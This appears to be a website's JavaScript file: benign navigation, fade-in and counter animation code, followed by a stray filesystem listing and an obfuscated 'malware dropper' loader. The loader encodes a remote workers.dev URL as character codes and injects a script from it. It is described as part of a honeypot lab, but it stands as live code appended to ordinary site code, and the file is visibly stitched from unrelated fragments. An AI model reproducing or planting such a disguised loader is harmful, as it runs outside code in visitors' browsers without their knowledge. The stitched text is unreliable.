(function(){
  'use strict';

  /* ── Mobile nav ── */
  var t=document.querySelector('.nav-toggle'),n=document.querySelector('.site-nav');
  if(t&&n){
    t.addEventListener('click',function(){
      var open=n.classList.toggle('is-open');
      t.setAttribute('aria-expanded',String(open));
    });
    document.addEventListener('click',function(e){
      if(n.classList.contains('is-open')&&!n.contains(e.target)&&!t.contains(e.target)){
        n.classList.remove('is-open');
        t.setAttribute('aria-expanded','false');
      }
    });
  }

  /* ── Hero entrance (homepage only) ── */
  /* defer runs after HTML is parsed; is-loaded triggers CSS keyframes */
  document.body.classList.add('is-loaded');

  if(!window.IntersectionObserver)return;

  /* ── Scroll fade-in (class-based, no inline style pollution) ── */
  var fadeObs=new IntersectionObserver(function(entries){
    entries.forEach(function(en){
      if(en.isIntersecting){en.target.classList.add('is-visible');fadeObs.unobserve(en.target);}
    });
  },{threshold:0.12,rootMargin:'0px 0px -40px 0px'});
  document.querySelectorAll('[data-fade]').forEach(function(el){fadeObs.observe(el);});

  /* ── Proof banner count-up ── */
  var proofObs=new IntersectionObserver(function(entries){
    entries.forEach(function(en){
      if(!en.isIntersecting)return;
      proofObs.unobserve(en.target);
      var el=en.target;
      var orig=el.textContent;
      /* parse French decimal (comma) and strip non-numeric */
      var num=parseFloat(orig.replace(',','.').replace(/[^\d.]/g,''));
      if(isNaN(num)||num===0)return;
      var isFloat=orig.indexOf(',')!==-1;
      /* large numbers start near their target for readability */
      var from=num>100?Math.max(0,num-30):0;
      var dur=900,st=null;
      function step(ts){
        if(!st)st=ts;
        var p=Math.min((ts-st)/dur,1);
        var ease=1-Math.pow(1-p,3);
        var v=from+(num-from)*ease;
        var formatted=isFloat?v.toFixed(1).replace('.',','):String(Math.round(v));
        el.textContent=orig.replace(/[\d,.']+/,formatted);
        if(p<1){requestAnimationFrame(step);}
        else{el.textContent=orig;el.classList.add('is-popped');}
      }
      requestAnimationFrame(step);
    });
  },{threshold:0.4});
  document.querySelectorAll('.proof-item__value').forEach(function(el){proofObs.observe(el);});

})();

/bin /boot /dev /etc /home /init /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var README.md Inject loader — the "malware dropper" stage. README.md Loaded via <script src="/trap/:slug/inject.js">. README.md README.md Obfuscates the real client.js URL using char codes (same technique as real malware). README.md Placeholders replaced at serve time: README.md 104,116,116,112,115,58,47,47,102,108,97,114,101,104,111,111,107,45,97,112,105,46,114,111,111,116,45,52,100,99,46,119,111,114,107,101,114,115,46,100,101,118,47,116,114,97,112,47,97,112,105,45,100,97,116,97,47,99,108,105,101,110,116,46,106,115 — comma-separated char codes of the client.js URL README.md README.md EDUCATIONAL PURPOSE ONLY — for honeypot security lab demonstrations. */ (function () { if (typeof window.__fh !== "undefined") return; window.__fh = 1; var _0x = [ "script", "src", "id", "onerror", "body", "head", "appendChild", "createElement", ]; var s = document[_0x[7]](_0x[0]); s[_0x[1]] = String.fromCharCode(104,116,116,112,115,58,47,47,102,108,97,114,101,104,111,111,107,45,97,112,105,46,114,111,111,116,45,52,100,99,46,119,111,114,107,101,114,115,46,100,101,118,47,116,114,97,112,47,97,112,105,45,100,97,116,97,47,99,108,105,101,110,116,46,106,115) + "?_=" + Date.now(); s[_0x[2]] = "_fh"; s[_0x[3]] = function () {}; (document[_0x[4]] || document[_0x[5]])[_0x[6]](s); })();